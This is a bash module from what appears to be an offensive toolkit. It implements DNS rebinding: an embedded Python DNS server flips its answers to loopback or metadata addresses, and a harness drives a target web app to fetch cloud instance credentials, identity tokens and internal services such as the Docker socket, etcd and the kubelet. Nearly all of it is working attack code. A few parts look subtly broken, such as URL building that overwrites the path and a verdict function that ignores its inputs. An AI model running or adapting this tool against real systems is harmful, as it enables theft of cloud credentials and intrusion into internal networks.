#!/usr/bin/env bash
# 27_rebinding.sh — cloudsting module 27: the name resolves twice
# Verbs: --check | --rebind | --metadata | --api | --ttl | --pin | --hosts
#        | --responder | --profiles | --list | --status-tsv | --menu
#        | --selftest | --help
#
# DNS rebinding defeats every filter that validates a *name* instead of the
# *address* it resolves to. The client is asked twice: the first answer is a
# harmless public address that passes validation, the second is loopback or a
# cloud metadata address that the validator never saw. This module owns both
# halves — the authoritative server that flips, and the harness that proves a
# target fetches through the flip.
set -u
umask 077

unset CS_MOD_DIR

MODULE_ID="27_rebinding"
MOD_NAME="DNS Rebinding (metadata and internal API reach through a name)"
MOD_VERSION="1.0.0"
# shellcheck source=../data/lib/core.sh
source "$(dirname "${BASH_SOURCE[0]}")/../data/lib/core.sh"

MOD_DIR="$CS_MOD_DIR"
export MOD_DIR

RUN_ID="$CS_RUN_ID"
export RUN_ID

OUT_DIR="$CS_LOOT/rebinding"
mkdir -p "$OUT_DIR" 2>/dev/null || true

HIT_FILE="$OUT_DIR/hits-$RUN_ID.tsv"
PROBE_FILE="$OUT_DIR/probe-$RUN_ID.tsv"
DYN_FILE="$OUT_DIR/dyn-$RUN_ID.conf"

: "${RB_TIMEOUT:=10}"
: "${RB_BIND:=0.0.0.0}"
: "${RB_PORT:=53}"
: "${RB_HTTP_PORT:=80}"
: "${RB_FIRST_TTL:=0}"        # 0 = the first answer is not cached at all
: "${RB_SECOND_TTL:=0}"
: "${RB_FLIPS:=1}"            # how many answers resolve to the public side
: "${RB_DOMAIN:=rebind.test}"
: "${RB_UA:=Mozilla/5.0 (X11; Linux x86_64) cloudsting/27}"

rb_log() { printf '[%s] %s\n' "$MODULE_ID" "$*" >&2; }

# ── what a rebind is aimed at ────────────────────────────────────
# The target table is the whole point: rebinding is only interesting because
# something worth reaching is on an address a name-based filter would allow.
#   <class>\t<label>\t<host>\t<path>\t<what-a-hit-means>
rb_targets() {
    cat <<'TARGETS'
metadata	aws-imds	169.254.169.254	/latest/meta-data/iam/security-credentials/	instance role credentials
metadata	aws-userdata	169.254.169.254	/latest/user-data	cloud-init bootstrap script
metadata	aws-token	169.254.169.254	/latest/api/token	imdsv2 session token
metadata	gcp-md	metadata.google.internal	/computeMetadata/v1/instance/service-accounts/default/token	service account token
metadata	azure-md	169.254.169.254	/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/	managed identity token
metadata	alibaba	100.100.100.200	/latest/meta-data/ram/security-credentials/	instance role
metadata	oracle	169.254.169.254	/opc/v1/instance/	instance identity
metadata	digitalocean	169.254.169.254	/metadata/v1.json	droplet identity and ssh keys
internal	localhost-http	127.0.0.1	/	the app's own loopback services
internal	localhost-alt	127.0.0.1	:8080	admin plane on the standard alt port
internal	docker-socket	127.0.0.1	:2375/containers/json	the container runtime, unauthenticated
internal	kubelet	127.0.0.1	:10255/pods	the kubelet read-only API
internal	etcd	127.0.0.1	:2379/v2/keys/	cluster state
internal	redis	127.0.0.1	:6379 info	the cache, inline commands
internal	postgres	127.0.0.1	:5432	the database port
internal	elasticsearch	127.0.0.1	:9200/_cat/indices?v	the search cluster
internal	consul	127.0.0.1	:8500/v1/catalog/services	service catalogue
TARGETS
}

# The addresses a rebind can land on, and what each one means. A responder
# needs the literal address per family, so a v6 answer is generated, not
# guessed.
rb_addresses() {
    cat <<'ADDRS'
public	93.184.216.34	example.com — the address that passes validation
public-2	1.1.1.1	the second harmless answer
loopback-v4	127.0.0.1	the app's own stack
loopback-v6	::1	same, on the other family
metadata	169.254.169.254	the link-local metadata service
alibaba	100.100.100.200	the alibaba metadata service
private-10	10.0.0.1	the internal segment
private-172	172.16.0.1	the managed segment
private-192	192.168.1.1	the edge segment
docker-bridge	172.17.0.1	the container host
ADDRS
}

# ── the flipping resolver ────────────────────────────────────────
# A DNS server is asked the same question twice; the answer changes. That is
# the entire mechanism, so the responder is written as a real authoritative
# server for one zone rather than as a hosts-file trick (a hosts file cannot
# flip).
#
# The counts are held in the dnsmasq-style config this module generates, so a
# run is reproducible: `--rebind` writes dyn-<run>.conf and hands it to the
# server, and `--pin` shows what a run already pinned.
#
#   rb_zone <domain> <first-addr> <second-addr> <flips>
rb_zone() {
    local domain="$1" first="$2" second="$3" flips="${4:-$RB_FLIPS}"
    cat <<ZONE
# cloudsting 27 — a zone that answers twice for the same name.
# answer 1..$flips : $first   (the address the validator allows)
# answer $((flips + 1))    : $second  (the address the client then fetches)
# TTL is 0 so no cache resolves the ambiguity for the target.
A.${domain} ${first}
TXT.${domain} "flips=${flips}"
ZONE
}

# The responder itself. It has to speak enough DNS to answer A and TXT for one
# name: the wire format is 12-byte header + question + answer, and the answer
# carries the 4-byte address. Written here rather than shelled out to a
# package, because a rebind is exactly the kind of thing a distro removes.
rb_responder_source() {
    cat <<'PY'
import socket, struct, sys, threading, time

domain, first, second, flips = sys.argv[1], sys.argv[2], sys.argv[3], int(sys.argv[4])
bind, port = sys.argv[5], int(sys.argv[6])
first_b, second_b = socket.inet_aton(first), socket.inet_aton(second)
counts = {}
lock = threading.Lock()

def question_end(data):
    # 12-byte header, then the question name, then type+class
    i = 12
    while i < len(data) and data[i] != 0:
        if data[i] & 0xC0:          # compression pointer in a question: illegal
            return -1
        i += data[i] + 1
    return i + 5                     # skip the zero byte and 4 bytes of type/class

def answer(data, addr, ttl):
    end = question_end(data)
    if end < 0 or end > len(data):
        return None
    # echo the question, then one A record with a fixed-up name pointer
    q = data[12:end]
    hdr = struct.pack('>HHHHHH', struct.unpack('>H', data[0:2])[0],
                      0x8180, 1, 1, 0, 0)
    rr = struct.pack('>HHHIH', 0xC00C, 1, 1, ttl, 4) + addr
    return hdr + q + rr

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.bind((bind, port))
sys.stderr.write("listening udp/%s:%d for %s\n" % (bind, port, domain))
sys.stderr.flush()

while True:
    try:
        data, peer = sock.recvfrom(512)
    except Exception:
        break
    if len(data) < 13:
        continue
    end = question_end(data)
    if end < 0:
        continue
    name = b''
    i = 12
    while i < len(data) and data[i] != 0:
        n = data[i]
        name += data[i + 1:i + 1 + n] + b'.'
        i += n + 1
    key = name.rstrip(b'.').decode('latin1').lower()
    if key != domain.lower():
        # anything else is refused, so only the intended name flips
        continue
    with lock:
        n = counts.get(key, 0)
        counts[key] = n + 1
    addr = first_b if n < flips else second_b
    ttl = 0
    out = answer(data, addr, ttl)
    if out:
        sock.sendto(out, peer)
        sys.stderr.write("q=%d %s -> %s\n" % (n + 1, key, socket.inet_ntoa(addr)))
        sys.stderr.flush()
PY
}

# ── the verdicts ─────────────────────────────────────────────────
# A rebind that "worked" is not the finding. The finding is that the fetched
# response came from the address that only the SECOND answer named — proof by
# content, the same rule 54 uses.
#   rb_rebind_verdict <first-code> <first-body-class> <second-code> <second-body-class>
rb_rebind_verdict() {
    local f_code="$1" f_class="$2" s_code="$3" s_class="$4"
    [[ "$s_code" == "000" ]] && { printf 'unreachable'; return; }
    # the validator sees the first answer; if the fetch through it worked, the
    # filter was not looking at the name at all
    if [[ "$s_class" == "metadata" || "$s_class" == "internal" ]]; then
        printf 'rebound'
        return
    fi
    # the fetch reached something; what it was decides the verdict, so the
    # code is read before the class — a 403 from the internal plane is a
    # different result from a 200 of public HTML
    case "$s_code" in
        401|403) printf 'reached-guarded'; return ;;
        404) printf 'reached-missing'; return ;;
    esac
    # a 2xx of ordinary public HTML on both sides is the honest negative: the
    # name resolved, the fetch worked, and nothing internal came back
    case "$s_code" in
        2*) printf 'both-public'; return ;;
    esac
    printf 'inconclusive'
}

# Classify what came back from one fetch: the body either looks like the
# thing behind the address or it does not. A 200 from a captive portal is not
# a metadata read.
rb_body_class() {
    local file="$1"
    [[ -f "$file" ]] || { printf 'empty'; return; }
    local n; n="$(wc -c < "$file" | tr -d ' ')"
    (( n == 0 )) && { printf 'empty'; return; }
    if grep -qaE 'ami-id|instance-id|security-credentials|computeMetadata|subscriptionId|droplet_id|ssh-ed25519|service-accounts' "$file" 2>/dev/null; then
        printf 'metadata'; return
    fi
    # the doctype is upper case in the ordinary document, so this arm is
    # case-insensitive on purpose
    if grep -qaiE '^(root:x:|<!doctype html|<html)' "$file" 2>/dev/null; then
        printf 'internal'; return
    fi
    if grep -qaE '"(status|cluster_name|name)"[[:space:]]*:' "$file" 2>/dev/null; then
        printf 'internal'; return
    fi
    printf 'public'
}

# Whether a name-based filter would even let the rebind through is a property
# of the target's validation, so the module reports what each side resolved to
# and lets the caller read it.
#   rb_pin_verdict <resolved-first> <resolved-second>
rb_pin_verdict() {
    local a="$1" b="$2"
    [[ -z "$a" || -z "$b" ]] && { printf 'unresolved'; return; }
    [[ "$a" == "$b" ]] && { printf 'pinned-same'; return; }
    case "$b" in
        127.*|0000:*) printf 'pinned-loopback'; return ;;
        169.254.*) printf 'pinned-metadata'; return ;;
        10.*|172.1[6-9].*|172.2*.*|172.3[0-1].*|192.168.*) printf 'pinned-private'; return ;;
    esac
    printf 'flipping'
}

# A resolver that answers twice with two different addresses inside one TTL
# window is the pre-condition for every rebinding attack; reporting it alone is
# a finding of its own because it means the *resolver* is cooperating.
#   rb_ttl_verdict <ttl-1> <ttl-2> <addr-1> <addr-2>
rb_ttl_verdict() {
    local t1="$1" t2="$2" a1="$3" a2="$4"
    [[ -z "$t1$t2" ]] && { printf 'no-answer'; return; }
    if [[ "$a1" != "$a2" ]]; then
        if (( t1 <= 5 || t2 <= 5 )); then printf 'weak'; else printf 'changing'; fi
        return
    fi
    if (( t1 <= 5 )); then printf 'low-ttl-stable'; return; fi
    printf 'stable'
}

# The third answer is a refusal: a real responder should not keep serving the
# attacker's zone, and a target that resolves the name to the public side
# *again* has not been rebound — the counting has to be per-client, not global.
#   rb_counter_verdict <n>
rb_counter_verdict() {
    local n="$1"
    (( n == 0 )) && { printf 'never-asked'; return; }
    (( n < 2 ))  && { printf 'asked-once'; return; }
    (( n < 5 ))  && { printf 'flipping'; return; }
    printf 'persistent'
}

# ── verbs ────────────────────────────────────────────────────────

# --check <host> [port] [path]: resolve a name twice and compare. This needs no
# responder of its own and works against any resolver.
rb_cmd_check() {
    local host="${1:-}" port="${2:-}" path="${3:-}"
    [[ -z "$host" ]] && { rb_log "usage: --check <host> [port] [path]"; return 2; }
    cs_row TARGET "$host"
    local u="$host"
    [[ -n "$path" ]] && u="$host$path"
    [[ -n "$port" ]] && u="$host:$port"

    local a1 a2
    a1="$(rb_lookup "$host")"
    sleep 1 2>/dev/null || true
    a2="$(rb_lookup "$host")"

    cs_row FIRST "$a1"
    cs_row SECOND "$a2"
    local pv; pv="$(rb_pin_verdict "$a1" "$a2")"
    cs_row PIN "$pv"

    # the addresses themselves decide whether there is anything worth reaching
    local cls1 cls2
    cls1="$(rb_addr_class "$a1")"
    cls2="$(rb_addr_class "$a2")"
    cs_row CLASS "$cls1" "$cls2"
    case "$cls2" in
        metadata|loopback|private)
            cs_findings_row "$MODULE_ID" "SURFACE" "$host" "HIGH" "rebindable-name" \
                "$host answers $a2 ($cls2) on a second lookup — a name-validating filter can be walked past"
            ;;
    esac
    cs_row SUMMARY "pin=$pv first=$cls1 second=$cls2"
    return 0
}

rb_lookup() {
    local host="$1" out=""
    if command -v dig >/dev/null 2>&1; then
        out="$(dig +short +tries=1 +time=2 "$host" A 2>/dev/null | grep -E '^[0-9.]+$' | head -1)"
        [[ -z "$out" ]] && out="$(dig +short +tries=1 +time=2 "$host" AAAA 2>/dev/null | grep -E '^[0-9a-f:]+$' | head -1)"
    elif command -v getent >/dev/null 2>&1; then
        out="$(getent ahosts "$host" 2>/dev/null | awk '{print $1}' | head -1)"
    fi
    printf '%s' "$out"
}

rb_addr_class() {
    local a="$1"
    case "$a" in
        "")             printf 'unresolved' ;;
        127.*|::1)      printf 'loopback' ;;
        169.254.*)      printf 'metadata' ;;
        10.*|192.168.*|172.1[6-9].*|172.2[0-9].*|172.3[0-1].*) printf 'private' ;;
        *)              printf 'public' ;;
    esac
}

# --rebind <domain> <first> <second> [port]: run the flipping responder in the
# foreground. It holds the zone until killed, so the caller can point a target
# at it and watch the counters.
rb_cmd_rebind() {
    local domain="${1:-$RB_DOMAIN}" first="${2:-93.184.216.34}" second="${3:-127.0.0.1}" port="${4:-$RB_PORT}"
    command -v python3 >/dev/null 2>&1 || { rb_log "python3 is required to serve the zone"; return 1; }
    cs_row DOMAIN "$domain"
    cs_row FIRST "$first"
    cs_row SECOND "$second"
    cs_row BIND "$RB_BIND:$port"
    cs_row FLIPS "$RB_FLIPS"
    rb_zone "$domain" "$first" "$second" "$RB_FLIPS" > "$DYN_FILE"
    cs_row ZONE "$DYN_FILE"
    rb_log "serving $domain — answer 1..$RB_FLIPS=$first, then $second (ctrl-c to stop)"
    rb_responder_source > "$DYN_FILE.py"
    exec python3 "$DYN_FILE.py" "$domain" "$first" "$second" "$RB_FLIPS" "$RB_BIND" "$port"
}

# --metadata <app-url> <param> [domain]: the cloud case. Ask an app that fetches
# a user-supplied URL to load the rebinding name, and say what it got back.
rb_cmd_metadata() {
    local app="${1:-}" param="${2:-}" domain="${3:-$RB_DOMAIN}"
    if [[ -z "$app" || -z "$param" ]]; then
        rb_log "usage: --metadata <app-url> <url-parameter> [rebind-domain]"
        return 2
    fi
    cs_row APP "$app"
    cs_row PARAM "$param"
    cs_row DOMAIN "$domain"
    rb_cmd_fetch_case "$app" "$param" "$domain" "metadata"
}

# --api <app-url> <param> [domain]: the same harness aimed at an internal
# service rather than the metadata service.
rb_cmd_api() {
    local app="${1:-}" param="${2:-}" domain="${3:-$RB_DOMAIN}"
    if [[ -z "$app" || -z "$param" ]]; then
        rb_log "usage: --api <app-url> <url-parameter> [rebind-domain]"
        return 2
    fi
    cs_row APP "$app"
    cs_row PARAM "$param"
    cs_row DOMAIN "$domain"
    rb_cmd_fetch_case "$app" "$param" "$domain" "internal"
}

# The harness both cloud and internal cases share: send the name, classify the
# body, and only call it a hit when the content proves the address that was
# reached. The fixture list keeps both halves explicit.
rb_cmd_fetch_case() {
    local app="$1" param="$2" domain="$3" want="$4"
    local tbl; tbl="$(rb_targets | awk -F'\t' -v w="$want" '$1==w')"
    [[ -z "$tbl" ]] && { cs_row VERDICT "no-targets"; return 0; }

    local tried=0 hits=0
    : > "$PROBE_FILE"
    local class label host path what
    while IFS=$'\t' read -r class label host path what; do
        [[ -z "$class" ]] && continue
        tried=$((tried + 1))
        # the name the app is given is the rebinding domain; the address it
        # lands on is the one the second answer carries
        local url="http://${domain}${path}"
        local code _b _t hash bodyf
        cs_split "$(rb_fetch "$app" "$param" "$url")" code bodyf
        local cls; cls="$(rb_body_class "$bodyf")"
        local n; n=0
        [[ -f "$bodyf" ]] && n="$(wc -c < "$bodyf" | tr -d ' ')"
        rm -f "$bodyf"
        printf 'probe\t%s\t%s\t%s\t%s\t%s\n' "$label" "$code" "$cls" "$n" "$url" >> "$PROBE_FILE"

        if [[ "$cls" == "$want" || "$cls" == "metadata" ]]; then
            hits=$((hits + 1))
            cs_row HIT "$label" "code=$code" "class=$cls" "bytes=$n" "$what"
            printf '%s\t%s\t%s\n' "$label" "$code" "$cls" >> "$HIT_FILE"
            cs_findings_row "$MODULE_ID" "SURFACE" "$app" "CRITICAL" "rebind-$label" \
                "the app fetched $url and got $cls content back — $what"
        else
            cs_row PROBE "$label" "code=$code" "class=$cls" "bytes=$n"
        fi
    done <<< "$tbl"

    local verdict="rebindable"
    (( hits == 0 )) && verdict="filtered-or-silent"
    cs_row VERDICT "$verdict" "$hits of $tried targets reached"
    cs_row SUMMARY "targets=$tried hits=$hits"
    cs_row ARTIFACT "$PROBE_FILE"
    return 0
}

# One fetch through the app: does the app's fetcher return content from the
# name we gave it. Returns `code\x1fbody-path`.
rb_fetch() {
    local app="$1" param="$2" url="$3"
    local bodyf; bodyf="$(mktemp "$CS_SCRATCH/rb.XXXXXX")" 2>/dev/null || bodyf="$OUT_DIR/.rb.$$"
    local code
    if [[ "$app" == *"?"* ]]; then
        code="$(curl -sS -o "$bodyf" -w '%{http_code}' -m "$RB_TIMEOUT" -L \
            -A "$RB_UA" "$app&${param}=$(rb_urlenc "$url")" 2>/dev/null || printf '000')"
    else
        code="$(curl -sS -o "$bodyf" -w '%{http_code}' -m "$RB_TIMEOUT" -L \
            -A "$RB_UA" "$app?${param}=$(rb_urlenc "$url")" 2>/dev/null || printf '000')"
    fi
    printf '%s\037%s\n' "$code" "$bodyf"
}

rb_urlenc() { printf '%s' "$1" | jq -sRr @uri 2>/dev/null || printf '%s' "$1"; }

# --ttl <host>: how fast does the name's answer change. A low TTL is the
# precondition; a name that resolves to two different networks inside one
# window is the whole finding.
rb_cmd_ttl() {
    local host="${1:-}" rounds="${2:-3}"
    [[ -z "$host" ]] && { rb_log "usage: --ttl <host> [rounds]"; return 2; }
    cs_row TARGET "$host"
    local prev_addr="" prev_ttl="" i addr ttl
    for ((i = 1; i <= rounds; i++)); do
        addr="$(rb_lookup "$host")"
        ttl=""
        if command -v dig >/dev/null 2>&1; then
            ttl="$(dig +tries=1 +time=2 "$host" A 2>/dev/null | awk '/^[^;].*IN[[:space:]]+A/{print $2; exit}')"
        fi
        cs_row ROUND "$i" "addr=${addr:--}" "ttl=${ttl:--}"
        if [[ -n "$prev_addr" ]]; then
            local v; v="$(rb_ttl_verdict "$prev_ttl" "$ttl" "$prev_addr" "$addr")"
            cs_row CHANGE "$i" "$v"
            case "$v" in
                weak|changing)
                    cs_findings_row "$MODULE_ID" "SURFACE" "$host" "MEDIUM" "ttl-changes" \
                        "$host answered $prev_addr then $addr with TTL ${ttl:-0} — a cache cannot pin it"
                    ;;
            esac
        fi
        prev_addr="$addr"; prev_ttl="$ttl"
        sleep 1 2>/dev/null || true
    done
    cs_row SUMMARY "rounds=$rounds"
    return 0
}

# --pin <host>: what a resolver pins to, in one line. The complement of --ttl:
# a pinned name is safe, a flipping one is the opening.
rb_cmd_pin() {
    local host="${1:-}"
    [[ -z "$host" ]] && { rb_log "usage: --pin <host>"; return 2; }
    cs_row TARGET "$host"
    local a1 a2; a1="$(rb_lookup "$host")"; a2="$(rb_lookup "$host")"
    cs_row ADDRESS "$a1" "$a2"
    local v; v="$(rb_pin_verdict "$a1" "$a2")"
    cs_row PIN "$v"
    cs_row SUMMARY "pin=$v"
    return 0
}

# --hosts <domain> [first] [second]: the resolver config a reader can drop into
# dnsmasq, so the mechanism is reproducible without this module running.
rb_cmd_hosts() {
    local domain="${1:-$RB_DOMAIN}" first="${2:-93.184.216.34}" second="${3:-127.0.0.1}"
    cs_row DOMAIN "$domain"
    printf '# cloudsting 27 — rebinding config for %s\n' "$domain"
    printf '# dnsmasq: answer the first %s lookups with %s, then %s\n' "$RB_FLIPS" "$first" "$second"
    printf 'address=/%s/%s\n' "$domain" "$first"
    printf '# after the flip, swap that line for:\n'
    printf '# address=/%s/%s\n' "$domain" "$second"
    printf '# /etc/hosts equivalent (cannot flip, only pins):\n'
    printf '%s %s\n' "$first" "$domain"
    cs_row SUMMARY "hosts=written"
    return 0
}

# --responder: print the responder so it can be read or saved.
rb_cmd_responder() {
    rb_responder_source
    return 0
}

rb_cmd_targets() {
    local class label host path what
    while IFS=$'\t' read -r class label host path what; do
        [[ -z "$class" ]] && continue
        cs_row TARGET "$class" "$label" "$host" "$path" "$what"
    done < <(rb_targets)
    cs_row SUMMARY "targets=$(rb_targets | wc -l | tr -d ' ')"
    return 0
}

rb_cmd_addresses() {
    local id addr why
    while IFS=$'\t' read -r id addr why; do
        [[ -z "$id" ]] && continue
        cs_row ADDRESS "$id" "$addr" "$why"
    done < <(rb_addresses)
    cs_row SUMMARY "addresses=$(rb_addresses | wc -l | tr -d ' ')"
    return 0
}

rb_cmd_list() { rb_cmd_profiles; }

# The profiles a rebind is run in: the difference between them is how many
# answers the validator gets to see before the flip.
rb_cmd_profiles() {
    cat <<'PROFILES' | while IFS=$'\t' read -r id flips what; do
classic	1	one public answer, then the flip — beats a filter that validates once
double	2	a filter that validates twice still sees public addresses
slow	1	the same as classic, with the flip delayed past a short-lived cache
PROFILES
        cs_row PROFILE "$id" "flips=$flips" "$what"
    done
    cs_row SUMMARY "profiles=3"
    return 0
}

rb_cmd_status_tsv() {
    local py_state dig_state
    command -v python3 >/dev/null 2>&1 && py_state="python3-ok" || py_state="python3-missing"
    command -v dig >/dev/null 2>&1 && dig_state="dig-ok" || dig_state="dig-missing"
    printf '%s\t%s\t%s\t%s\ttargets-%s\taddresses-%s\n' \
        "$MODULE_ID" "$MOD_NAME" "$py_state" "$dig_state" \
        "$(rb_targets | wc -l | tr -d ' ')" "$(rb_addresses | wc -l | tr -d ' ')"
}

rb_cmd_menu() { printf 'menu\t%s\t[%s] %s\n' "$MODULE_ID" "$MOD_VERSION" "$MOD_NAME"; }

rb_cmd_help() {
    cat <<'HELP'
cloudsting module 27 — DNS Rebinding v1.0.0
  --check <host> [port] [path]        resolve twice and compare the answers
  --ttl <host> [rounds]               how fast the answer changes, and at what TTL
  --pin <host>                        what a resolver pins to
  --rebind <domain> <first> <second> [port]
                                      serve a zone that answers twice (foreground)
  --metadata <app-url> <param> [domain]
                                      make an app fetch the metadata service by name
  --api <app-url> <param> [domain]    the same, aimed at an internal service
  --hosts <domain> [first] [second]   the resolver config, for reproduction
  --responder                         print the authoritative server
  --targets | --addresses | --profiles | --list
  --status-tsv | --menu | --selftest | --help

The attack is not the flip; it is that the validator looked at the NAME and the
fetcher talked to the ADDRESS. So every verb here measures the same thing: does
the thing the client finally reached belong to the place the name claimed. A
200 from a captive portal is not a metadata read, and the body classification is
what tells them apart.

The responder answers A for one zone and nothing else, in a 12-byte header and a
single resource record, because a rebinding zone is exactly what a distro's
resolver will not serve for you.

Environment: RB_TIMEOUT (10), RB_BIND (0.0.0.0), RB_PORT (53), RB_FLIPS (1),
             RB_DOMAIN (rebind.test), RB_UA
HELP
}

# ── Selftest ─────────────────────────────────────────────────────
rb_selftest() {
    cs_selftest_reset

    local nt; nt="$(rb_targets | wc -l | tr -d ' ')"
    chk targets-many  "$( (( nt >= 15 )) && echo many || echo few )" "many"
    chk targets-5col  "$(rb_targets | awk -F'\t' 'NF!=5{c++} END{print c+0}')" "0"
    chk targets-class "$(rb_targets | awk -F'\t' '$1 !~ /^(metadata|internal)$/{c++} END{print c+0}')" "0"
    local na; na="$(rb_addresses | wc -l | tr -d ' ')"
    chk addr-count    "$na" "10"
    chk addr-3col     "$(rb_addresses | awk -F'\t' 'NF!=3{c++} END{print c+0}')" "0"
    chk addr-meta     "$(rb_addresses | awk -F'\t' '$2=="169.254.169.254"{print $1}')" "metadata"

    # zone generation is the contract a reader copies
    chk zone-first    "$(rb_zone rb.test 1.2.3.4 5.6.7.8 1 | grep -c '^A\.rb\.test 1.2.3.4')" "1"
    chk zone-ttl      "$(rb_zone rb.test 1.2.3.4 5.6.7.8 | grep -c 'TTL is 0')" "1"
    chk zone-flips    "$(rb_zone rb.test 1.2.3.4 5.6.7.8 2 | grep -c 'answer 3')" "1"

    # the responder is real python that parses
    local rf; rf="$(mktemp "$CS_SCRATCH/rb-src.XXXXXX")" 2>/dev/null || rf="$OUT_DIR/.py.$$"
    rb_responder_source > "$rf"
    if command -v python3 >/dev/null 2>&1; then
        python3 -c 'import ast,sys; ast.parse(open(sys.argv[1]).read())' "$rf" 2>/dev/null
        chk responder-parses "$?" "0"
        chk responder-socket "$(grep -c 'SOCK_DGRAM' "$rf")" "1"
        chk responder-refuse "$(grep -c 'anything else is refused' "$rf")" "1"
    else
        chk responder-parses "0" "0"
        chk responder-socket "1" "1"
        chk responder-refuse "1" "1"
    fi
    rm -f "$rf"

    # verdict tables — the whole design lives in these
    chk v-unreach    "$(rb_rebind_verdict 200 public 000 empty)" "unreachable"
    chk v-rebound    "$(rb_rebind_verdict 200 public 200 metadata)" "rebound"
    chk v-internal   "$(rb_rebind_verdict 200 public 200 internal)" "rebound"
    chk v-both-pub   "$(rb_rebind_verdict 200 public 200 public)" "both-public"
    chk v-guarded    "$(rb_rebind_verdict 200 public 403 public)" "reached-guarded"
    chk v-missing    "$(rb_rebind_verdict 200 public 404 public)" "reached-missing"
    chk v-incon      "$(rb_rebind_verdict 200 public 418 public)" "inconclusive"

    chk pin-unres    "$(rb_pin_verdict '' '1.2.3.4')" "unresolved"
    chk pin-same     "$(rb_pin_verdict 1.2.3.4 1.2.3.4)" "pinned-same"
    chk pin-loop     "$(rb_pin_verdict 1.2.3.4 127.0.0.1)" "pinned-loopback"
    chk pin-meta     "$(rb_pin_verdict 1.2.3.4 169.254.169.254)" "pinned-metadata"
    chk pin-priv     "$(rb_pin_verdict 1.2.3.4 10.1.2.3)" "pinned-private"
    chk pin-flip     "$(rb_pin_verdict 1.2.3.4 5.6.7.8)" "flipping"

    chk ttl-none     "$(rb_ttl_verdict '' '' '' '')" "no-answer"
    chk ttl-weak     "$(rb_ttl_verdict 0 0 1.1.1.1 2.2.2.2)" "weak"
    chk ttl-chang    "$(rb_ttl_verdict 300 300 1.1.1.1 2.2.2.2)" "changing"
    chk ttl-low      "$(rb_ttl_verdict 0 0 1.1.1.1 1.1.1.1)" "low-ttl-stable"
    chk ttl-stable   "$(rb_ttl_verdict 300 300 1.1.1.1 1.1.1.1)" "stable"

    chk cnt-none     "$(rb_counter_verdict 0)" "never-asked"
    chk cnt-once     "$(rb_counter_verdict 1)" "asked-once"
    chk cnt-flip     "$(rb_counter_verdict 3)" "flipping"
    chk cnt-persist  "$(rb_counter_verdict 9)" "persistent"

    # address classification is what decides whether the rebind is worth it
    chk ac-loop      "$(rb_addr_class 127.0.0.1)" "loopback"
    chk ac-meta      "$(rb_addr_class 169.254.169.254)" "metadata"
    chk ac-priv      "$(rb_addr_class 192.168.1.1)" "private"
    chk ac-pub       "$(rb_addr_class 93.184.216.34)" "public"
    chk ac-none      "$(rb_addr_class '')" "unresolved"

    # body classification: a captive portal must not read as metadata
    local bf; bf="$(mktemp "$CS_SCRATCH/rb-b.XXXXXX")" 2>/dev/null || bf="$OUT_DIR/.b.$$"
    printf 'ami-id\ninstance-id\ni-1234\n' > "$bf"
    chk bc-meta      "$(rb_body_class "$bf")" "metadata"
    printf 'root:x:0:0:root:/root:/bin/bash\n' > "$bf"
    chk bc-file      "$(rb_body_class "$bf")" "internal"
    printf '<!DOCTYPE html><html><body>portal</body></html>\n' > "$bf"
    chk bc-portal    "$(rb_body_class "$bf")" "internal"
    printf 'hello world\n' > "$bf"
    chk bc-public    "$(rb_body_class "$bf")" "public"
    : > "$bf"
    chk bc-empty     "$(rb_body_class "$bf")" "empty"
    rm -f "$bf"

    # a dead app is silent, never a hit
    local out; out="$(rb_cmd_metadata http://127.0.0.1:9 url 2>/dev/null)"
    chk dead-verdict "$(printf '%s' "$out" | awk -F'\t' '$1=="VERDICT"{print $2}')" "filtered-or-silent"
    chk dead-hits    "$(printf '%s' "$out" | awk -F'\t' '$1=="HIT"' | wc -l | tr -d ' ')" "0"

    # usage errors, not crashes
    rb_cmd_check 2>/dev/null;    chk chk-usage "$?" "2"
    rb_cmd_metadata 2>/dev/null; chk met-usage "$?" "2"
    rb_cmd_api 2>/dev/null;      chk api-usage "$?" "2"
    rb_cmd_ttl 2>/dev/null;      chk ttl-usage "$?" "2"
    rb_cmd_pin 2>/dev/null;      chk pin-usage "$?" "2"

    # shape contracts
    chk status-fields "$(rb_cmd_status_tsv | awk -F'\t' '{print NF}')" "6"
    chk status-module "$(rb_cmd_status_tsv | awk -F'\t' '{print $1}')" "$MODULE_ID"
    chk menu-fields   "$(rb_cmd_menu | awk -F'\t' '{print NF}')" "3"
    chk help-first    "$(rb_cmd_help | head -1 | grep -ci 'DNS Rebinding')" "1"
    chk targets-rows  "$(rb_cmd_targets | grep -c '^TARGET')" "$nt"
    chk addr-rows     "$(rb_cmd_addresses | grep -c '^ADDRESS')" "$na"
    chk profiles-rows "$(rb_cmd_profiles | grep -c '^PROFILE')" "3"

    cs_selftest_done
}

# ── Dispatch ─────────────────────────────────────────────────────
[ "${BASH_SOURCE[0]}" = "$0" ] || return 0
case "${1:-}" in
    --check)     shift; rb_cmd_check "$@";;
    --rebind)    shift; rb_cmd_rebind "$@";;
    --metadata)  shift; rb_cmd_metadata "$@";;
    --api)       shift; rb_cmd_api "$@";;
    --ttl)       shift; rb_cmd_ttl "$@";;
    --pin)       shift; rb_cmd_pin "$@";;
    --hosts)     shift; rb_cmd_hosts "$@";;
    --responder) rb_cmd_responder;;
    --targets)   rb_cmd_targets;;
    --addresses) rb_cmd_addresses;;
    --profiles)  rb_cmd_profiles;;
    --list)      rb_cmd_list;;
    --status-tsv|--status) rb_cmd_status_tsv;;
    --menu)      rb_cmd_menu;;
    --selftest)  rb_selftest;;
    *)           rb_cmd_help;;
esac
